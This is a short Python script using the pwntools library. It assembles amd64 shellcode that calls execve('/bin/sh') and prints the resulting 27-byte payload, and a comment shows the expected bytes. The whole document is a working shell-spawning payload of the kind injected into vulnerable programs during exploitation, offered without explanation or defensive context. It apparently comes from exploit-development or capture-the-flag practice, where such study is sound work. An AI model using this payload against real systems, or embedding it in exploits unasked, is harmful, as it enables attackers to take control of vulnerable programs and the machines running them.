from pwn import *
context.arch = 'amd64'

# execve("/bin/sh", NULL, NULL)
sc = asm("""
xor rsi, rsi
xor rdx, rdx
xor rax, rax
mov al, 0x3b
movabs rdi, 0x68732f6e69622f
push rdi
mov rdi, rsp
syscall
""")
print(len(sc), sc)
# 27 b'H1\xf6H1\xd2H1\xc0\xb0;H\xbf/bin/sh\x00WH\x89\xe7\x0f\x05'